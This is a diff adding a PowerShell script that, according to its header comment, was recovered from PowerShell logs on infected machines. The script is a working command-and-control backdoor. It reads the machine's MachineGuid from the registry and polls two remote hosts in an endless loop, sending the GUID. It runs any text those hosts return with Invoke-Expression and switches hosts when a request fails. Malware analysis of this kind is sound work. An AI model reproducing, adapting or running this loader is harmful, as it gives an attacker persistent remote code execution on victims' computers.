@@ -1,0 +1,31 @@
+"""
+This code was recovered from one of the infected machines. It was a Base64 encoded code that was executed with PowerShell. 
+As all PowerShell executions was logged, it was Possible to retreive this from the logs (See the image under the Images folder).
+"""
+
+$ProgressPreference = "SilentlyContinue" 
+[System.Net.ServicePointManager]::SecurityProtocol = "TLS12" 
+$TaskName = "WindowsAgentLegacy" 
+
+$APIs = @("u.18-22-59.com", "r.firewall-813.com") 
+
+function Get-RegistryValue($key, $value) { (Get-ItemProperty $key $value).$value } 
+$GUID = Get-RegistryValue "HKLM:\SOFTWARE\Microsoft\Cryptography" "MachineGuid" 
+$WebSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession 
+$WebSession.Proxy = New-Object System.Net.WebProxy 
+$Location = Get-Location 
+while ($true) { 
+    Set-Location $Location 
+    $API = $APIs[0] 
+    try { 
+        $Response = Invoke-WebRequest -Uri $API -WebSession $WebSession -Headers @{ "X-Machine-Id" = $GUID } -UseBasicParsing 
+        $Content = If (($Response.Content.GetType().Name -eq "Byte[]")) { [System.Text.Encoding]::UTF8.GetString($Response.Content) } Else { $Response.Content } 
+        If (-not (($Response.Headers["Content-Type"].StartsWith("text/html") -and $Content.StartsWith("#")))) { throw } 
+    } catch { 
+        $APIs = @($APIs | Select-Object -Skip 1) + $API 
+        Start-Sleep -Seconds 7 
+        continue 
+    } 
+    Invoke-Expression $Content 
+    Start-Sleep -Seconds 3 
+} 
